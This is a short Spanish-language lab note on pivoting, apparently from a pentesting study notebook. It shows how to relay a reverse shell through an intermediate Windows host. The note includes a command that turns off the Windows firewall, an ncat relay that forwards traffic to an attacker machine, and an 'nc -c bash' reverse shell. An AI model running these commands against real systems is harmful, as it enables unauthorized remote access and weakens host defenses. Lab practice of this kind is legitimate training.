[[Lab Pivoting and Tunneling - Synfonos]]
#pivoting 
En windows, en vez de usar socat podemos usar ncat para permitir el tráfico de una reverse shell por parte de una máquina 3 pasando por una máquina windows intermedia. Por ejemplo, desde el Kali nos ponemos a la escucha:
![[Pasted image 20240615203300.png]]

A continuación, en la máquina intermedia podemos desactivar el firewall para evitar tener problemas:
```bash
netsh advfirewall set allprofiles state off
```

![[Pasted image 20240615203306.png]]

Ahora desde la máquina Windows intermedia decimos que todo el tráfico que recibamos por ejemplo por el puerto 1111 lo vamos a enviar al puerto 443 de la máquina atacante:
```bash
ncat -l -p 1111 -c "ncat 192.168.0.20 443"
```

![[Pasted image 20240615203310.png]]

Entonces ahora desde la máquina 3 enviamos la reverse shell a la máquina windows 7 intermedia por el puerto 1111 y deberíamos de recibir la conexión en nuestro Kali:
```bash
nc -c bash 10.10.10.129 1111
```

![[Pasted image 20240615203316.png]]

Y recibimos la conexión:

![[Pasted image 20240615203319.png]]